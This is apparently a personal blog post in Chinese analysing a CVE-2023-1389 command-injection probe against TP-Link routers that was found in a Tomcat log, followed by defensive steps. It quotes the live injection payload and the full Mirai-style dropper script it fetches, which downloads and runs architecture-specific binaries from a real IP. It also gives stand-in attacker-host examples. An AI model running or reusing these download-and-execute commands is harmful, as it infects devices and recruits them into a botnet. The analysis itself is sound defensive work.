---
title: 记一次应用被注入攻击 2025-06-11
icon: pen-to-square
date: 2025-06-11
order: 1
author: Rain Man
category:
  - 网络安全
# A page can have multiple tags
tag:
  - CVE-2023-1389
# this page is sticky in article list
sticky: true
# this page will appear in starred articles
star: true
---

[[TOC]]

# 记一次应用被注入攻击 2025-06-11

## 背景

今天在查看应用日志时偶然发现一段可疑的日志，内容如下
```text
Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level. 
java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) ]. The valid characters are defined in RFC 7230 and RFC 3986
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:484)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:270)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:905)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1743)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
	at java.base/java.lang.Thread.run(Thread.java:1583)
```
这引起了我的高度警觉，因为请求中包含明显的命令注入尝试。

```shell
$(wget+http://31.59.40.187/x/tplink+-O-|sh)
```
::: danger
请不要在自己的设备上执行此命令
:::

由于我的应用使用的Tomcat，其在解析 HTTP 请求行时发现非法字符（如 ;, |, $, + 等），违反了 HTTP 协议（RFC 7230、RFC 3986）；

因此 Tomcat 拒绝处理该请求，并没有执行任何命令，应用是安全的，但说明应用正在被扫描/探测。

## 分析

攻击的 URI 为：
```text
[/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) ]
```
其中`;`的用法之前没有见过，查了一下，发现是嵌入式设备和老式Web框架中支持的一种合法参数传递方式。

`stok` 是 TP-Link 和 OpenWRT（LuCI）设备中经常用来表示 “session token” 的字段。

关于`country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)`
如果服务器存在漏洞，例如：
```shell
uci set system.@system[0].country="$country"
```
或者直接执行
```shell
eval "uci set system.@system[0].country=$country"

```
那这时：
```shell
$country = $(wget http://... | sh)
```
就会导致真正执行：
```shell
wget http://31.59.40.187/x/tplink -O - | sh
```
这就相当于远程下载并执行恶意脚本。


随后我获取了 `http://31.59.40.187/x/tplink` 内容。

```shell
# TP-Link is aware of reports that the Remote Code Execution (REC) vulnerability detailed in CVE-2023-1389 in AX21 has been added to the Mirai botnet Arsenal.


cd /tmp; wget http://31.59.40.187/j/mle1; chmod 777 mle1; ./mle1 tplink; rm mle1
cd /tmp; wget http://31.59.40.187/j/mbe1; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
cd /tmp; wget http://31.59.40.187/j/aale1; chmod 777 aale1; ./aale1 tplink; rm aale1
cd /tmp; wget http://31.59.40.187/j/a5le1; chmod 777 a5le1;./a5le1 tplink; rm a5le1
cd /tmp; wget http://31.59.40.187/j/a7le1; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
cd /tmp; wget http://31.59.40.187/j/ppc1; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
cd /tmp; wget http://31.59.40.187/j/xle1; chmod 777 xle1; ./xle1 tplink; rm xle1
cd /tmp; wget http://31.59.40.187/j/xale1; chmod 777 xale1; ./xale1 tplink; rm xale1

#cd /tmp; tftp -g -r mle1 31.59.40.187; chmod 777 mle1; ./mle1 tplink; rm mle1
#cd /tmp; tftp -g -r mbe1 31.59.40.187; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
#cd /tmp; tftp -g -r aale1 31.59.40.187; chmod 777 aale1; ./aale1 tplink; rm aale1
#cd /tmp; tftp -g -r a5le1 31.59.40.187; chmod 777 a5le1;./a5le1 tplink; rm a5le1
#cd /tmp; tftp -g -r a7le1 31.59.40.187; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
#cd /tmp; tftp -g -r ppc1 31.59.40.187; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
#cd /tmp; tftp -g -r xle1 31.59.40.187; chmod 777 xle1; ./xle1 tplink; rm xle1
#cd /tmp; tftp -g -r xale1 31.59.40.187; chmod 777 xale1; ./xale1 tplink; rm xale1

cd /tmp; ftpget 31.59.40.187 mle1 mle1; chmod 777 mle1; ./mle1 tplink; rm mle1
cd /tmp; ftpget 31.59.40.187 mbe1 mbe1; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
cd /tmp; ftpget 31.59.40.187 aale1 aale1; chmod 777 aale1; ./aale1 tplink; rm aale1
cd /tmp; ftpget 31.59.40.187 a5le1 a5le1; chmod 777 a5le1;./a5le1 tplink; rm a5le1
cd /tmp; ftpget 31.59.40.187 a7le1 a7le1; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
cd /tmp; ftpget 31.59.40.187 ppc1 ppc1; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
cd /tmp; ftpget 31.59.40.187 xle1 xle1; chmod 777 xle1; ./xle1 tplink; rm xle1
cd /tmp; ftpget 31.59.40.187 xale1 xale1; chmod 777 xale1; ./xale1 tplink; rm xale1
```

该脚本重复执行了如下逻辑：
```shell
cd /tmp
wget http://31.59.40.187/j/mle1
chmod 777 mle1
./mle1 tplink
rm mle1
```

`mle1、mbe1、aale1、a5le1、a7le1、ppc1、xle1、xale1` 这些文件名可能代表了不同的CPU架构构建的同一恶意程序副本，是为不同嵌入式设备或服务器环境准备的，确保尽可能多地感染目标设备。


上面的注释表明了这是就是一个*RCE攻击*，并且附带了漏洞信息*CVE-2023-1389*。

::: details RCE攻击介绍

RCE（Remote Code Execution，远程代码执行）攻击是一种攻击者可以在受害者设备或系统上远程执行任意代码的攻击方式。RCE 是最严重的网络安全漏洞之一，通常意味着：

>攻击者只需要发送特制请求，就能控制目标服务器、设备或操作系统的行为。

**RCE 攻击模式常见类型**

1. 命令注入（Command Injection）
   通过用户输入拼接 Shell 命令时未正确转义，导致攻击者输入的命令被直接执行，例如：
   ```http request
   GET /api?name=abc;wget http://evil.com/shell.sh|sh HTTP/1.1
   ```

2. 反序列化漏洞（Insecure Deserialization）
   反序列化用户输入的对象，攻击者构造恶意 payload 触发执行逻辑，例如：
   ```java
   ObjectInputStream.readObject();  // 读取了攻击者发送的恶意对象
   ```

3. 模板注入（Template Injection）
   模板引擎允许执行脚本时，攻击者通过注入表达式触发任意代码执行，例如：
   ```http request
   ${new java.lang.ProcessBuilder("calc").start()}
   ```
4. 路径遍历+上传 WebShell
   攻击者上传恶意脚本（如 .php 文件），并通过路径遍历等手段访问执行。

5. 远程加载执行
   服务端代码允许从远程 URL 加载脚本并执行，例如：
   ```shell
   wget http://attacker.com/x.sh | sh
   ```

:::

在nvd网站上搜索该漏洞，发现这是一个只存在指定TP-Link固件版本上的漏洞。

>**TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219** contained a command injection vulnerability in the country form of the /cgi-bin/luci;stok=/locale endpoint on the web management interface.
Specifically, the country parameter of the write operation was not sanitized before being used in a call to popen(), allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.

## 应对措施
虽然自己的服务器不存在此漏洞，但是为了防止其他RCE攻击，还是需要一些安全检查和防御措施。

1. 将不明IP加入黑名单
2. 检查所有开放端口，只开放必要的端口
3. 更新系统安全补丁
4. 查看是否有定时任务/进程异常
```shell
crontab -l
ps | grep -v '\[' | grep -v 'root'
```

## 后记

写到这里突然想到家中的宽带是通过OpenWRT路由进行拨号的，并且是通过光猫的桥接模式连接的，似乎是暴漏在公网上，也有着被恶意脚本扫描和攻击的风险，需要检查一下防火墙规则。
这种网络连接方式已经用了两三年了而且没有更新过路由的固件，如果真被恶意脚本攻击了，家中的所有设备包括NAS，不敢想象。
